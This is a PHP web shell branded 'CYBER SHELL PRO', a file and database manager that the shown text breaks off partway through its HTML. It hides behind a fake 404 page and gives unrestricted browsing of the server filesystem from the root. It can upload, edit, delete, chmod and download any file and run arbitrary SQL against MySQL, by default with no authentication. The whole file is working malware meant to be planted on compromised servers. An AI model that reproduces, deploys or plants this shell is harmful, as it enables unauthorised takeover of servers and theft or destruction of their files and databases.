<?php
// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);
set_time_limit(0);
ini_set('memory_limit', '-1');
session_start();

// ======================
// SECURITY & STEALTH
// ======================
$password_protected = false;
$access_password = "hacktheplanet";

if ($password_protected && !isset($_SESSION['authenticated'])) {
    if (isset($_POST['access_password'])) {
        if ($_POST['access_password'] === $access_password) {
            $_SESSION['authenticated'] = true;
        } else {
            die("<h2 style='color: red'>Access Denied!</h2>");
        }
    } else {
        echo '<!DOCTYPE html><html><head><title>404 - Page Not Found</title><style>body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }input { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 10px; }button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; }</style></head><body><h1>404 - Page Not Found</h1><form method="post"><input type="password" name="access_password" placeholder="Access Key" required><button type="submit">Authenticate</button></form></body></html>';
        exit;
    }
}

// ======================
// CONFIGURATION
// ======================
$base_path = '/';
$current_path = isset($_GET['path']) ? realpath($_GET['path']) : realpath($base_path);
if ($current_path === false) $current_path = realpath($base_path);
$session_id = substr(md5(uniqid()), 0, 8);

// ======================
// DATABASE CONFIGURATION & MULTI-DB SUPPORT
// ======================
$db_config = [
    'host' => 'localhost',
    'user' => 'root', 
    'pass' => '',
    'port' => '3306'
];

// Initialize databases session array
if (!isset($_SESSION['databases'])) {
    $_SESSION['databases'] = [];
}

// ======================
// DATABASE FUNCTIONS
// ======================
function getDatabases($host, $user, $pass) {
    try {
        $pdo = new PDO("mysql:host=$host", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query("SHOW DATABASES");
        return $stmt->fetchAll(PDO::FETCH_COLUMN);
    } catch (Exception $e) {
        return [];
    }
}

function getTables($host, $user, $pass, $database) {
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$database", $user, $pass);
        $stmt = $pdo->query("SHOW TABLES");
        return $stmt->fetchAll(PDO::FETCH_COLUMN);
    } catch (Exception $e) {
        return [];
    }
}

function getTableData($host, $user, $pass, $database, $table, $limit = 100) {
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$database", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // Get table structure
        $stmt = $pdo->query("DESCRIBE `$table`");
        $structure = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        // Get table data
        $stmt = $pdo->query("SELECT * FROM `$table` LIMIT $limit");
        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        // Get row count
        $countStmt = $pdo->query("SELECT COUNT(*) as total FROM `$table`");
        $count = $countStmt->fetch(PDO::FETCH_ASSOC);
        
        return [
            'structure' => $structure,
            'data' => $data,
            'total_rows' => $count['total']
        ];
    } catch (Exception $e) {
        return ['structure' => [], 'data' => [], 'total_rows' => 0, 'error' => $e->getMessage()];
    }
}

function executeQuery($host, $user, $pass, $database, $query) {
    try {
        $pdo = new PDO("mysql:host=$host;dbname=$database", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $stmt = $pdo->query($query);
        
        if ($stmt->columnCount() > 0) {
            return [
                'success' => true,
                'type' => 'select',
                'data' => $stmt->fetchAll(PDO::FETCH_ASSOC),
                'affected_rows' => $stmt->rowCount()
            ];
        } else {
            return [
                'success' => true,
                'type' => 'modify',
                'affected_rows' => $stmt->rowCount()
            ];
        }
    } catch (Exception $e) {
        return [
            'success' => false,
            'error' => $e->getMessage()
        ];
    }
}

// ======================
// FILE OPERATIONS
// ======================
$alert = '';
$current_path_encoded = urlencode($current_path);

// Handle POST operations
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Create Directory
    if (isset($_POST['new_dir']) && !empty($_POST['new_dir'])) {
        $new_dir = $current_path . '/' . basename($_POST['new_dir']);
        if (!file_exists($new_dir)) {
            mkdir($new_dir, 0755) ? $alert = "✅ Directory created!" : $alert = "❌ Creation failed!";
        } else {
            $alert = "⚠️ Directory already exists!";
        }
    }
    
    // Create File
    if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
        $new_file = $current_path . '/' . basename($_POST['new_file']);
        if (!file_exists($new_file)) {
            file_put_contents($new_file, '') ? $alert = "✅ File created!" : $alert = "❌ Creation failed!";
        } else {
            $alert = "⚠️ File already exists!";
        }
    }
    
    // File Upload
    if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
        $target = $current_path . '/' . basename($_FILES['uploaded_file']['name']);
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target)) {
            $alert = "✅ File uploaded!";
        } else {
            $alert = "❌ Upload failed!";
        }
    }
    
    // Extract ZIP File
    if (isset($_POST['extract_zip']) && isset($_POST['zip_file']) && !empty($_POST['zip_file'])) {
        $zip_file = $current_path . '/' . basename($_POST['zip_file']);
        $extract_path = $current_path . '/' . pathinfo($_POST['zip_file'], PATHINFO_FILENAME);
        
        if (file_exists($zip_file) && is_readable($zip_file)) {
            $zip = new ZipArchive();
            if ($zip->open($zip_file) === TRUE) {
                if (!file_exists($extract_path)) {
                    mkdir($extract_path, 0755, true);
                }
                if ($zip->extractTo($extract_path)) {
                    $zip->close();
                    $alert = "✅ ZIP file extracted successfully to: " . basename($extract_path);
                } else {
                    $alert = "❌ Failed to extract ZIP file!";
                }
            } else {
                $alert = "❌ Cannot open ZIP file!";
            }
        } else {
            $alert = "❌ ZIP file not found or not readable!";
        }
    }
    
    // Database Operations
    if (isset($_POST['db_action'])) {
        $db_host = $_POST['db_host'] ?? $db_config['host'];
        $db_user = $_POST['db_user'] ?? $db_config['user'];
        $db_pass = $_POST['db_pass'] ?? $db_config['pass'];
        $db_name = $_POST['db_name'] ?? '';
        $connection_name = $_POST['connection_name'] ?? 'default';
        
        if ($_POST['db_action'] === 'connect') {
            try {
                $pdo = new PDO("mysql:host=$db_host", $db_user, $db_pass);
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
                
                // Store connection in session
                $_SESSION['databases'][$connection_name] = [
                    'host' => $db_host,
                    'user' => $db_user,
                    'pass' => $db_pass,
                    'name' => $connection_name,
                    'connected' => true
                ];
                
                // Set as current connection
                $_SESSION['current_db_connection'] = $connection_name;
                
                $alert = "✅ Database connected successfully as '$connection_name'!";
            } catch (Exception $e) {
                $alert = "❌ Database connection failed: " . $e->getMessage();
            }
        }
        elseif ($_POST['db_action'] === 'switch_connection') {
            $connection_name = $_POST['connection_name'];
            if (isset($_SESSION['databases'][$connection_name])) {
                $_SESSION['current_db_connection'] = $connection_name;
                $alert = "✅ Switched to database connection: '$connection_name'";
            }
        }
        elseif ($_POST['db_action'] === 'execute_query' && isset($_POST['sql_query'])) {
            if (isset($_SESSION['current_db_connection'])) {
                $conn_name = $_SESSION['current_db_connection'];
                $conn = $_SESSION['databases'][$conn_name];
                $currentDatabase = $_POST['db_name'] ?? '';
                
                $result = executeQuery($conn['host'], $conn['user'], $conn['pass'], $currentDatabase, $_POST['sql_query']);
                
                if ($result['success']) {
                    if ($result['type'] === 'select') {
                        $alert = "✅ Query executed successfully! Affected rows: " . $result['affected_rows'];
                        $_SESSION['last_query_result'] = $result['data'];
                    } else {
                        $alert = "✅ Query executed successfully! Affected rows: " . $result['affected_rows'];
                    }
                } else {
                    $alert = "❌ Query failed: " . $result['error'];
                }
            }
        }
        elseif ($_POST['db_action'] === 'insert_row' && isset($_POST['table_name'])) {
            if (isset($_SESSION['current_db_connection'])) {
                $conn_name = $_SESSION['current_db_connection'];
                $conn = $_SESSION['databases'][$conn_name];
                $currentDatabase = $_POST['db_name'] ?? '';
                $table = $_POST['table_name'];
                
                $columns = [];
                $values = [];
                $placeholders = [];
                
                foreach ($_POST as $key => $value) {
                    if (strpos($key, 'field_') === 0 && $value !== '') {
                        $column = substr($key, 6);
                        $columns[] = "`$column`";
                        $values[] = $value;
                        $placeholders[] = '?';
                    }
                }
                
                if (!empty($columns)) {
                    $query = "INSERT INTO `$table` (" . implode(', ', $columns) . ") VALUES (" . implode(', ', $placeholders) . ")";
                    
                    try {
                        $pdo = new PDO("mysql:host={$conn['host']};dbname=$currentDatabase", $conn['user'], $conn['pass']);
                        $stmt = $pdo->prepare($query);
                        $stmt->execute($values);
                        $alert = "✅ Row inserted successfully!";
                    } catch (Exception $e) {
                        $alert = "❌ Insert failed: " . $e->getMessage();
                    }
                }
            }
        }
        elseif ($_POST['db_action'] === 'update_row' && isset($_POST['table_name']) && isset($_POST['primary_key']) && isset($_POST['primary_value'])) {
            if (isset($_SESSION['current_db_connection'])) {
                $conn_name = $_SESSION['current_db_connection'];
                $conn = $_SESSION['databases'][$conn_name];
                $currentDatabase = $_POST['db_name'] ?? '';
                $table = $_POST['table_name'];
                $primaryKey = $_POST['primary_key'];
                $primaryValue = $_POST['primary_value'];
                
                $updates = [];
                $values = [];
                
                foreach ($_POST as $key => $value) {
                    if (strpos($key, 'field_') === 0 && $key !== 'field_' . $primaryKey) {
                        $column = substr($key, 6);
                        $updates[] = "`$column` = ?";
                        $values[] = $value;
                    }
                }
                
                if (!empty($updates)) {
                    $values[] = $primaryValue;
                    $query = "UPDATE `$table` SET " . implode(', ', $updates) . " WHERE `$primaryKey` = ?";
                    
                    try {
                        $pdo = new PDO("mysql:host={$conn['host']};dbname=$currentDatabase", $conn['user'], $conn['pass']);
                        $stmt = $pdo->prepare($query);
                        $stmt->execute($values);
                        $alert = "✅ Row updated successfully!";
                    } catch (Exception $e) {
                        $alert = "❌ Update failed: " . $e->getMessage();
                    }
                }
            }
        }
        elseif ($_POST['db_action'] === 'delete_row' && isset($_POST['table_name']) && isset($_POST['primary_key']) && isset($_POST['primary_value'])) {
            if (isset($_SESSION['current_db_connection'])) {
                $conn_name = $_SESSION['current_db_connection'];
                $conn = $_SESSION['databases'][$conn_name];
                $currentDatabase = $_POST['db_name'] ?? '';
                $table = $_POST['table_name'];
                $primaryKey = $_POST['primary_key'];
                $primaryValue = $_POST['primary_value'];
                
                $query = "DELETE FROM `$table` WHERE `$primaryKey` = ?";
                
                try {
                    $pdo = new PDO("mysql:host={$conn['host']};dbname=$currentDatabase", $conn['user'], $conn['pass']);
                    $stmt = $pdo->prepare($query);
                    $stmt->execute([$primaryValue]);
                    $alert = "✅ Row deleted successfully!";
                } catch (Exception $e) {
                    $alert = "❌ Delete failed: " . $e->getMessage();
                }
            }
        }
    }
    
    // Edit File
    if (isset($_POST['file_content']) && isset($_POST['file_name'])) {
        $file = $current_path . '/' . basename($_POST['file_name']);
        if (is_writable($file)) {
            if (file_put_contents($file, $_POST['file_content'])) {
                $alert = "✅ File saved!";
                touch($file);
            } else {
                $alert = "❌ Save failed! Check permissions!";
            }
        } else {
            $alert = "❌ File not writable!";
        }
    }
    
    // Rename File
    if (isset($_POST['new_name']) && isset($_POST['old_name'])) {
        $old = $current_path . '/' . basename($_POST['old_name']);
        $new = $current_path . '/' . basename($_POST['new_name']);
        if (rename($old, $new)) {
            $alert = "✅ Renamed!";
        } else {
            $alert = "❌ Rename failed!";
        }
    }
    
    // Change Permissions
    if (isset($_POST['permissions']) && isset($_POST['perm_file'])) {
        $file = $current_path . '/' . basename($_POST['perm_file']);
        if (chmod($file, octdec($_POST['permissions']))) {
            $alert = "✅ Permissions updated!";
        } else {
            $alert = "❌ Permission change failed!";
        }
    }
}

// Handle GET actions
if (isset($_GET['delete'])) {
    $target = $current_path . '/' . basename($_GET['delete']);
    if (is_dir($target)) {
        rmdir($target) ? $alert = "✅ Directory deleted!" : $alert = "❌ Directory not empty!";
    } else {
        unlink($target) ? $alert = "✅ File deleted!" : $alert = "❌ Delete failed!";
    }
    header("Location: ?path=" . urlencode($current_path));
    exit;
}

if (isset($_GET['download'])) {
    $target = $current_path . '/' . basename($_GET['download']);
    
    if (is_dir($target)) {
        $archiveFile = $target . '.zip';
        $zip = new ZipArchive();
        if ($zip->open($archiveFile, ZipArchive::CREATE) === TRUE) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($target),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($target) + 1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
            $zip->close();
        }

        if (file_exists($archiveFile)) {
            header('Content-Type: application/zip');
            header('Content-Length: ' . filesize($archiveFile));
            header('Content-Disposition: attachment; filename="'.basename($archiveFile).'"');
            readfile($archiveFile);
            unlink($archiveFile);
            exit;
        }
    } else {
        if (file_exists($target)) {
            header('Content-Type: application/octet-stream');
            header('Content-Length: ' . filesize($target));
            header('Content-Disposition: attachment; filename="'.basename($target).'"');
            readfile($target);
            exit;
        }
    }
}

// Check if we're in editor mode
$editor_mode = isset($_GET['edit']) && !empty($_GET['edit']);
$editing_file = '';

if ($editor_mode) {
    $editing_file = $current_path . '/' . basename($_GET['edit']);
    if (!file_exists($editing_file) || is_dir($editing_file)) {
        $editor_mode = false;
    }
}

// ======================
// DATABASE STATE
// ======================
$databases = [];
$tables = [];
$tableData = [];
$currentDatabase = $_GET['db'] ?? '';
$currentTable = $_GET['table'] ?? '';

// Get current database connection
$currentConnection = $_SESSION['current_db_connection'] ?? 'default';
$dbConnected = isset($_SESSION['databases'][$currentConnection]);

if ($dbConnected) {
    $conn = $_SESSION['databases'][$currentConnection];
    $databases = getDatabases($conn['host'], $conn['user'], $conn['pass']);
    
    if ($currentDatabase) {
        $tables = getTables($conn['host'], $conn['user'], $conn['pass'], $currentDatabase);
        
        if ($currentTable) {
            $tableData = getTableData($conn['host'], $conn['user'], $conn['pass'], $currentDatabase, $currentTable);
        }
    }
}

// ======================
// UI RENDERING
// ======================
$parent_dir = dirname($current_path);
$is_root = ($current_path === realpath($base_path));
$items = scandir($current_path);

// ======================
// FIXED TAB LOGIC - This was the main issue
// ======================
$active_tab = 'fileManager';

// Only switch to database tab if we're explicitly doing database operations
if (isset($_GET['db']) || isset($_GET['table']) || isset($_GET['edit_row'])) {
    $active_tab = 'database';
} 
// Editor mode takes highest priority
elseif ($editor_mode) {
    $active_tab = 'editor';
}
// If we have a path parameter or no database parameters, we're in file manager
elseif (isset($_GET['path']) || (!isset($_GET['db']) && !isset($_GET['table']) && !isset($_GET['edit_row']))) {
    $active_tab = 'fileManager';
}

// Check if we're in edit mode for a specific row
$edit_row_mode = isset($_GET['edit_row']) && !empty($_GET['edit_row']);
$editing_row_data = [];

if ($edit_row_mode && $currentDatabase && $currentTable) {
    // Get the row data to edit
    $primary_key = $_GET['primary_key'] ?? '';
    $primary_value = $_GET['primary_value'] ?? '';
    
    if ($primary_key && $primary_value) {
        try {
            $conn = $_SESSION['databases'][$currentConnection];
            $pdo = new PDO("mysql:host={$conn['host']};dbname=$currentDatabase", $conn['user'], $conn['pass']);
            $stmt = $pdo->prepare("SELECT * FROM `$currentTable` WHERE `$primary_key` = ?");
            $stmt->execute([$primary_value]);
            $editing_row_data = $stmt->fetch(PDO::FETCH_ASSOC);
        } catch (Exception $e) {
            $alert = "❌ Error loading row data: " . $e->getMessage();
        }
    }
}

// Function to generate URL with all parameters - FIXED VERSION
function generateUrl($params = []) {
    global $current_path, $currentDatabase, $currentTable;
    $baseParams = ['path' => $current_path];
    
    // Only preserve database parameters if we're explicitly in database mode
    if (isset($_GET['db']) || isset($_GET['table']) || isset($_GET['edit_row'])) {
        if ($currentDatabase) {
            $baseParams['db'] = $currentDatabase;
        }
        if ($currentTable) {
            $baseParams['table'] = $currentTable;
        }
    }
    
    $allParams = array_merge($baseParams, $params);
    return '?' . http_build_query($allParams);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔧 CYBER SHELL PRO - File & Database Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --neon-green: #0f0;
            --neon-blue: #0af;
            --neon-purple: #f0f;
            --matrix-bg: #000;
            --text-white: #fff;
            --dark-card: #111;
            --darker-card: #0a0a0a;
        }
        body {
            background: var(--matrix-bg);
            color: var(--text-white);
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
        }
        .terminal {
            background: var(--darker-card);
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            font-family: 'Courier New', monospace;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow-y: auto;
        }
        .hacker-card {
            background: var(--dark-card);
            border: 1px solid var(--neon-green);
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
            transition: all 0.3s ease;
        }
        .hacker-card:hover {
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
            transform: translateY(-2px);
        }
        .neon-text { 
            text-shadow: 0 0 10px var(--neon-green), 0 0 20px var(--neon-green);
            color: var(--neon-green);
        }
        /* FIXED CODE EDITOR - NOT A MODAL */
        .editor-container {
            border: 1px solid var(--neon-green);
            border-radius: 5px;
            overflow: hidden;
            background: #1a1a1a;
            position: relative;
            margin-bottom: 20px;
        }
        .editor-wrapper {
            position: relative;
            height: 70vh;
        }
        .editor {
            width: 100%;
            height: 100%;
            background: #1a1a1a;
            color: #0f0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.5;
            border: none;
            padding: 15px;
            resize: none;
            outline: none;
            tab-size: 4;
            position: relative;
            z-index: 1;
        }
        .editor:focus {
            outline: none !important;
            box-shadow: none !important;
            background: #1a1a1a !important;
        }
        .editor-toolbar {
            background: #111;
            border-bottom: 1px solid #333;
            padding: 8px 15px;
            display: flex;
            gap: 10px;
            position: relative;
            z-index: 2;
        }
        .editor-toolbar button {
            background: #222;
            border: 1px solid #333;
            color: #0f0;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            transition: all 0.2s ease;
        }
        .editor-toolbar button:hover {
            background: #333;
            border-color: var(--neon-green);
        }
        .db-sidebar {
            background: var(--darker-card);
            border-right: 1px solid #333;
            height: calc(100vh - 250px);
            overflow-y: auto;
        }
        .db-table {
            cursor: pointer;
            padding: 8px 12px;
            border-bottom: 1px solid #333;
            transition: all 0.2s ease;
        }
        .db-table:hover {
            background: rgba(0, 255, 0, 0.1);
            border-left: 3px solid var(--neon-green);
        }
        .db-table.active {
            background: rgba(0, 255, 0, 0.2);
            border-left: 3px solid var(--neon-green);
        }
        .nav-tabs .nav-link { 
            background: #222; 
            color: #0f0; 
            border: 1px solid #333; 
            margin-right: 5px;
            border-radius: 5px 5px 0 0;
        }
        .nav-tabs .nav-link.active { 
            background: var(--darker-card); 
            border-bottom: 1px solid var(--darker-card);
            color: var(--neon-green);
            font-weight: bold;
        }
        .tab-pane { 
            background: var(--darker-card); 
            border: 1px solid #333; 
            border-top: none; 
            padding: 25px; 
            border-radius: 0 0 8px 8px;
            min-height: 600px;
        }
        .db-action-btn {
            margin: 2px;
            padding: 4px 8px;
        }
        .clickable {
            cursor: pointer !important;
        }
        .btn {
            cursor: pointer !important;
        }
        a {
            cursor: pointer !important;
        }
        .connection-badge {
            font-size: 0.7em;
            margin-left: 5px;
        }
        /* Fix for modal backdrop */
        .modal-backdrop {
            z-index: 1040;
        }
        .modal {
            z-index: 1050;
        }
        .inline-form {
            display: inline-block;
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>
    <div class="container-fluid mt-3">
        <!-- System Status Bar -->
        <div class="d-flex justify-content-between align-items-center mb-3 p-3 hacker-card">
            <div>
                <span class="neon-text"><i class="fas fa-shield-alt"></i> SESSION: <?= $session_id ?></span>
                <span class="badge bg-success">ACTIVE</span>
                <?php if ($dbConnected): ?>
                    <span class="badge bg-info">
                        <i class="fas fa-database"></i> 
                        DB: <?= $currentConnection ?>
                        <?php if ($currentDatabase): ?>
                            > <?= $currentDatabase ?>
                            <?php if ($currentTable): ?>
                                > <?= $currentTable ?>
                            <?php endif; ?>
                        <?php endif; ?>
                    </span>
                <?php endif; ?>
            </div>
            <div class="text-center">
                <span class="text-info"><i class="fas fa-satellite-dish"></i> <?= $_SERVER['REMOTE_ADDR'] ?? 'N/A' ?></span>
            </div>
            <div>
                <a href="<?= generateUrl() ?>" class="btn btn-sm btn-outline-danger"><i class="fas fa-sync-alt"></i> Refresh</a>
            </div>
        </div>

        <?php if ($alert): ?>
            <div class="alert hacker-card alert-dismissible fade show">
                <div class="d-flex align-items-center">
                    <span class="me-2"><i class="fas fa-bell"></i></span>
                    <div><?= $alert ?></div>
                </div>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="alert"></button>
            </div>
        <?php endif; ?>

        <!-- Main Navigation Tabs -->
        <ul class="nav nav-tabs" id="mainTabs" role="tablist">
            <li class="nav-item" role="presentation">
                <button class="nav-link <?= $active_tab === 'fileManager' ? 'active' : '' ?>" id="fileManager-tab" data-bs-toggle="tab" data-bs-target="#fileManager" type="button" role="tab">
                    <i class="fas fa-folder"></i> File Manager
                </button>
            </li>
            <li class="nav-item" role="presentation">
                <button class="nav-link <?= $active_tab === 'database' ? 'active' : '' ?>" id="database-tab" data-bs-toggle="tab" data-bs-target="#database" type="button" role="tab">
                    <i class="fas fa-database"></i> Database Manager
                </button>
            </li>
            <?php if ($editor_mode): ?>
            <li class="nav-item" role="presentation">
                <button class="nav-link active" id="editor-tab" data-bs-toggle="tab" data-bs-target="#editor" type="button" role="tab">
                    <i class="fas fa-code"></i> Code Editor
                </button>
            </li>
            <?php endif; ?>
        </ul>

        <div class="tab-content" id="mainTabsContent">
            <!-- File Manager Tab -->
            <div class="tab-pane fade <?= $active_tab === 'fileManager' ? 'show active' : '' ?>" id="fileManager" role="tabpanel">
                <!-- File Manager Content Here -->
                <div class="d-flex justify-content-between align-items-center mb-4">
                    <h2 class="neon-text"><i class="fas fa-folder"></i> Advanced File Manager</h2>
                    <div>
                        <span class="text-info">Current: </span>
                        <code class="text-warning"><?= htmlspecialchars($current_path) ?></code>
                        <?php if (!$is_root): ?>
                            <a href="<?= generateUrl(['path' => $parent_dir]) ?>" class="btn btn-outline-success btn-sm ms-2">
                                <i class="fas fa-level-up-alt"></i> Up
                            </a>
                        <?php endif; ?>
                    </div>
                </div>

                <!-- File Actions -->
                <div class="row g-3 mb-4">
                    <div class="col-md-2">
                        <form method="post" class="hacker-card p-2">
                            <div class="input-group input-group-sm">
                                <input type="text" name="new_dir" placeholder="New folder" class="form-control bg-dark text-white border-secondary">
                                <button class="btn btn-outline-success"><i class="fas fa-plus"></i></button>
                            </div>
                        </form>
                    </div>
                    <div class="col-md-2">
                        <form method="post" class="hacker-card p-2">
                            <div class="input-group input-group-sm">
                                <input type="text" name="new_file" placeholder="New file" class="form-control bg-dark text-white border-secondary">
                                <button class="btn btn-outline-success"><i class="fas fa-file"></i></button>
                            </div>
                        </form>
                    </div>
                    <div class="col-md-3">
                        <form method="post" enctype="multipart/form-data" class="hacker-card p-2">
                            <div class="input-group input-group-sm">
                                <input type="file" name="uploaded_file" class="form-control bg-dark text-white border-secondary">
                                <button class="btn btn-outline-info"><i class="fas fa-upload"></i></button>
                            </div>
                        </form>
                    </div>
                    <div class="col-md-3">
                        <form method="post" class="hacker-card p-2">
                            <div class="input-group input-group-sm">
                                <select name="zip_file" class="form-select bg-dark text-white border-secondary">
                                    <option value="">Extract ZIP...</option>
                                    <?php foreach ($items as $item): ?>
                                        <?php if ($item !== '.' && $item !== '..' && !is_dir($current_path . '/' . $item) && pathinfo($item, PATHINFO_EXTENSION) === 'zip'): ?>
                                            <option value="<?= htmlspecialchars($item) ?>"><?= htmlspecialchars($item) ?></option>
                                        <?php endif; ?>
                                    <?php endforeach; ?>
                                </select>
                                <button type="submit" name="extract_zip" class="btn btn-outline-danger"><i class="fas fa-file-archive"></i></button>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- File List -->
                <div class="hacker-card p-3">
                    <div class="table-responsive">
                        <table class="table table-dark table-hover">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Size</th>
                                    <th>Permissions</th>
                                    <th>Modified</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php foreach ($items as $item): ?>
                                    <?php if ($item === '.' || $item === '..') continue; ?>
                                    <?php
                                    $full_path = $current_path . '/' . $item;
                                    $is_dir = is_dir($full_path);
                                    $item_encoded = urlencode($item);
                                    $last_modified = date('Y-m-d H:i:s', filemtime($full_path));
                                    ?>
                                    <tr>
                                        <td>
                                            <?php if ($is_dir): ?>
                                                <a href="<?= generateUrl(['path' => $full_path]) ?>" class="text-white text-decoration-none">
                                                    <i class="fas fa-folder text-warning"></i> <?= htmlspecialchars($item) ?>
                                                </a>
                                            <?php else: ?>
                                                <i class="fas fa-file text-info"></i> <?= htmlspecialchars($item) ?>
                                            <?php endif; ?>
                                        </td>
                                        <td>
                                            <?php if (!$is_dir): ?>
                                                <span class="text-muted"><?= number_format(filesize($full_path) / 1024, 2) ?> KB</span>
                                            <?php else: ?>
                                                <span class="text-muted">-</span>
                                            <?php endif; ?>
                                        </td>
                                        <td><code class="text-info"><?= substr(sprintf('%o', fileperms($full_path)), -4) ?></code></td>
                                        <td><small class="text-muted"><?= $last_modified ?></small></td>
                                        <td>
                                            <div class="btn-group btn-group-sm">
                                                <?php if (!$is_dir): ?>
                                                    <a href="<?= generateUrl(['edit' => $item]) ?>" class="btn btn-outline-info">
                                                        <i class="fas fa-edit"></i>
                                                    </a>
                                                <?php endif; ?>
                                                <a href="<?= generateUrl(['download' => $item]) ?>" class="btn btn-outline-success">
                                                    <i class="fas fa-download"></i>
                                                </a>
                                                <button class="btn btn-outline-warning clickable" data-bs-toggle="modal" data-bs-target="#permsModal-<?= md5($item) ?>">
                                                    <i class="fas fa-key"></i>
                                                </button>
                                                <button class="btn btn-outline-primary clickable" data-bs-toggle="modal" data-bs-target="#renameModal-<?= md5($item) ?>">
                                                    <i class="fas fa-i-cursor"></i>
                                                </button>
                                                <a href="<?= generateUrl(['delete' => $item]) ?>" class="btn btn-outline-danger" onclick="return confirm('Delete <?= htmlspecialchars($item) ?>?')">
                                                    <i class="fas fa-trash"></i>
                                                </a>
                                            </div>
                                        </td>
                                    </tr>

                                    <!-- Permissions Modal -->
                                    <div class="modal fade" id="permsModal-<?= md5($item) ?>" tabindex="-1">
                                        <div class="modal-dialog">
                                            <div class="modal-content bg-dark text-white">
                                                <div class="modal-header border-secondary">
                                                    <h5 class="modal-title"><i class="fas fa-key"></i> Change Permissions: <?= $item ?></h5>
                                                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                                                </div>
                                                <form method="post">
                                                    <input type="hidden" name="perm_file" value="<?= $item ?>">
                                                    <div class="modal-body">
                                                        <div class="mb-3">
                                                            <label class="form-label">Permissions (octal):</label>
                                                            <input type="text" name="permissions" class="form-control bg-dark text-white border-secondary" value="<?= substr(sprintf('%o', fileperms($full_path)), -4) ?>" placeholder="e.g., 0644">
                                                        </div>
                                                    </div>
                                                    <div class="modal-footer border-secondary">
                                                        <button type="submit" class="btn btn-outline-success">Change</button>
                                                        <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Rename Modal -->
                                    <div class="modal fade" id="renameModal-<?= md5($item) ?>" tabindex="-1">
                                        <div class="modal-dialog">
                                            <div class="modal-content bg-dark text-white">
                                                <div class="modal-header border-secondary">
                                                    <h5 class="modal-title"><i class="fas fa-i-cursor"></i> Rename: <?= $item ?></h5>
                                                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                                                </div>
                                                <form method="post">
                                                    <input type="hidden" name="old_name" value="<?= $item ?>">
                                                    <div class="modal-body">
                                                        <div class="mb-3">
                                                            <label class="form-label">New Name:</label>
                                                            <input type="text" name="new_name" class="form-control bg-dark text-white border-secondary" value="<?= $item ?>">
                                                        </div>
                                                    </div>
                                                    <div class="modal-footer border-secondary">
                                                        <button type="submit" class="btn btn-outline-success">Rename</button>
                                                        <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
                                                    </div>
                                                </form>
                                            </div>
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <!-- Database Browser Tab -->
            <div class="tab-pane fade <?= $active_tab === 'database' ? 'show active' : '' ?>" id="database" role="tabpanel">
                <div id="databaseContent">
                    <?php if (!$dbConnected): ?>
                        <!-- Database Connection Form -->
                        <div class="row justify-content-center">
                            <div class="col-md-8">
                                <div class="hacker-card p-4">
                                    <h4 class="text-center mb-4"><i class="fas fa-plug"></i> Connect to Database</h4>
                                    <form method="post" id="dbConnectForm">
                                        <input type="hidden" name="path" value="<?= $current_path_encoded ?>">
                                        <div class="row g-3">
                                            <div class="col-md-4">
                                                <input type="text" name="db_host" class="form-control bg-dark text-white border-secondary" placeholder="Host" value="<?= $db_config['host'] ?>" required>
                                            </div>
                                            <div class="col-md-3">
                                                <input type="text" name="db_user" class="form-control bg-dark text-white border-secondary" placeholder="User" value="<?= $db_config['user'] ?>" required>
                                            </div>
                                            <div class="col-md-3">
                                                <input type="password" name="db_pass" class="form-control bg-dark text-white border-secondary" placeholder="Password">
                                            </div>
                                            <div class="col-md-2">
                                                <input type="text" name="connection_name" class="form-control bg-dark text-white border-secondary" placeholder="Connection Name" value="default" required>
                                            </div>
                                            <div class="col-12">
